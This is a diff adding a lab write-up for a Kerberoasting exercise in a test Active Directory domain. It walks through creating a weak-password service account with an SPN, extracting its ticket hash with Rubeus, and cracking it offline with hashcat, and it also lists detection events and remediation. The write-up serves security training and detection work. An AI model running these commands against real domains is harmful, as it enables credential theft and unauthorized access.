@@ -1,1 +1,64 @@
+# Phase 2 — Kerberoasting
 
+## Overview
+Kerberoasting targets service accounts with a Service Principal Name (SPN).
+Any authenticated domain user can request a Kerberos TGS ticket for any SPN.
+The ticket is encrypted with the service account password hash and can be cracked offline.
+
+## MITRE ATT&CK
+- **Tactic:** Credential Access
+- **Technique:** T1558.003 — Kerberoasting
+
+## Environment
+| Component | Details |
+|---|---|
+| Attacker | Windows 10 (WORKSTATION01) — domain user |
+| Target | svc-mssql service account on DC01 |
+| Tools | Rubeus v2.2.0, Hashcat |
+
+## Attack Steps
+
+### 1. Create Vulnerable Service Account (Lab Setup)
+```powershell
+New-ADUser -Name "svc-mssql" `
+    -SamAccountName "svc-mssql" `
+    -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) `
+    -Enabled $true -PasswordNeverExpires $true
+
+setspn -A MSSQLSvc/DC01.SOC.local:1433 svc-mssql
+setspn -L svc-mssql
+```
+
+### 2. Extract TGS Ticket via Rubeus
+```powershell
+C:\Tools\Rubeus.exe kerberoast /outfile:C:\Tools\tgs.hash
+```
+
+**Result:**
+- SamAccountName: svc-mssql
+- ServicePrincipalName: MSSQLSvc/DC01.SOC.local:1433
+- Supported ETypes: RC4_HMAC_DEFAULT
+- Hash written to: C:\Tools\tgs.hash
+
+### 3. Crack Hash Offline
+```bash
+hashcat -m 13100 /tmp/tgs.hash /usr/share/wordlists/rockyou.txt --force
+```
+
+**Result:** `Password1` recovered in under 30 seconds.
+
+## Evidence
+- Screenshots: `Evidence/Screenshots/phase2-rubeus-kerberoast.png`
+- Screenshots: `Evidence/Screenshots/phase2-tgs-cracked.png`
+- Screenshots: `Evidence/Screenshots/phase2-wazuh-alert-100010.png`
+
+## Detection
+| Source | Event ID | Indicator |
+|---|---|---|
+| Windows Security Log | 4769 | RC4 encryption (0x17) TGS request |
+| Wazuh | Rule 100010 | Kerberoasting — T1558.003 |
+
+## Remediation
+- Migrate service accounts to gMSA
+- Enforce AES-only Kerberos encryption
+- Use passwords longer than 25 characters for service accounts
